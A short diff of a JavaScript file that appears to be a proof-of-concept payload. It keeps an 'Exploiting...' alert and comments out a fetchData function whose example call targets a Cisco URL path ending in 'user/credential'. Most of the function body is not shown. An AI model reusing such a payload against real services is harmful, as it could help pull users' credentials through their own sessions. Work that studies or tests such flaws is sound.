@@ -1,4 +1,5 @@
 alert("Exploiting...");
+/*
 async function fetchData(url) {
   try {
     // Fetch the URL content
@@ -22,3 +23,4 @@ async function fetchData(url) {
 
 // Example usage
 fetchData('https://ciscoshare.cisco.com/alfext/ext/user/credential');
+*/
